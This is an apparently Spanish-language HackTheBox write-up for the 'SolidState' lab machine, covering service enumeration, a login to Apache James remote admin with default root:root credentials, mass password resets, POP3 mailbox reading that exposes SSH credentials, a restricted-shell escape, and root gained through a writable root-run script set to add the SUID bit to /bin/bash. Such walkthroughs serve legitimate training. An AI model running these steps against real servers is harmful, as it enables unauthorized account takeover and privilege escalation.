---
tags:
title: SolidState - Medium (HTB)
permalink: /SolidState-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---

---
# Reconocimiento

```bash
nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 01:15 EDT
Nmap scan report for 10.10.10.51
Host is up (0.37s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.4 [10.10.16.4])
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.12 seconds
```

## Service enumeration

### Port 80

En la pagina que se nos presenta en el puerto `80` aparece esto.

![Untitled 18 1](images/Untitled 18 1.jpg)

Debajo hay un apartado de contacto el cual podemos probar por tratar de poner una etiquetas `script` intentado un `XSS`, pero no vamos a tener exito.

#### Gobuster enumeration

```bash
gobuster dir -u http://solidstate.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 -x php,txt,js,html,bak,php.bak,md
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://solidstate.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              js,html,bak,php.bak,md,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 317] [--> http://solidstate.htb/images/]
/index.html           (Status: 200) [Size: 7776]
/about.html           (Status: 200) [Size: 7183]
/services.html        (Status: 200) [Size: 8404]
/assets               (Status: 301) [Size: 317] [--> http://solidstate.htb/assets/]
/README.txt           (Status: 200) [Size: 963]
/LICENSE.txt          (Status: 200) [Size: 17128]
```

No nos descubre nada interesante asi que pasamos a enumerar los demas servicios.

### Port 4555 -  James Remote Admin 

Si buscamos por las credenciales default de este servicio, vamos a ver que son `root:root`, por lo que podriamos probarlas.

```bash
nc -vn 10.10.10.51 4555
(UNKNOWN) [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Vemos que con exito conseguimos loguearnos como el administrador de este servicio.

```bash
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Vemos que dentro de las opciones que podemos ejecutar se encuentran `listusers` la cual es buena opcion para enumerar usuario validos del sistema, y la opcion `setpassword` para poder setearle la contraseña a cada usuario.

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Vemos varios usuario, por lo que podemos pasar a setearle una `pass` a cada uno.

```bash
setpassword thomas thomas
Password for thomas reset
setpassword john john
Password for john reset
setpassword mindy mindy
Password for mindy reset
setpassword mailadmin mailadmin
Password for mailadmin reset
```

Vemos que con exito logramos setearle/cambiarle la pass a cada uno de los usarios. Por lo que ahora por el puerto `110` el cual corre el servicio de `pop3`, el cual es un servicio de correos electronicos.

### Port 110 - pop3

Probemos logueandonos con cada uno de los usuarios y listando emails recibidos

```bash 
USER usuariox
PASS password
LIST
RETR <id>
```

Primero probamos con el usario , `james` y `thomas`, pero no tuvimos exito, por lo que probamos con los usuarios restantes
```bash
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john 
+OK
PASS john 
+OK Welcome john
```
Una vez logueado como el usuario `john`, listamos en busca de emails.

```bash
LIST
+OK 1 743
1 743
.
```

Vemos que en la bandeja de entrada tiene un email, ahora con el comando `RETR`listamos su contenido.

```bash
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

# Explotacion

Por lo que entendemos el email proviene del user `mailadmin` y se lo envia a `john` y le relata que al parecer le tiene que enviar unas 'nuevas' credenciales temporales a `mindy`, asi que podriamos chequear el email de `mindy`para verificar que john haya realizado su tarea.

```bash
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy 
+OK
PASS mindy 
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
```

Vemos que `mindy` tiene 2 emails.

```bash
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

Vemos que le asignaron una pass y user para loguearse via `SSH`.

```bash
ssh mindy@10.10.10.51
```

Vemos que con exito nos logueamos pero tenemos asignada una `rbash` con la cual tenemos como `PATH` asignado: `/home/mindy/bin` y si vemos dentro de esa ruta solo tenemos los comandos: `cat`, `env` y `ls`, asi que podemos intentar desloguearnos y asignarnos una `bash` para poder movernos comodamente.

```bash
ssh mindy@10.10.10.51 bash
```
# Post-Explotacion / Privilege escalation

![Untitled 19 1](images/Untitled 19 1.jpg)

Con el uso de `pspy` vemos que `root` corre con `sh` el archivo `tmp.py` que esta en el directorio `/opt` y vemos que efectivamente, tenemos permisos de escritura en dicho file por lo que podemos modificarlo a nuestro favor para ganar una shell como `root`.

```bash
cat tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
     os.system('chmod u+s /bin/bash')
except:
     sys.exit()
```

Chequeamos los permisos de la `bash`.

```bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
```

Esperamos a que `root` ejecute el archivo y se asigne el bit `suid` a la bash
```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
```

Convertimos nuestra shell a una como `root` y listo

```bash
bash -p
# whoami
root
```

`~Happy Hacking.`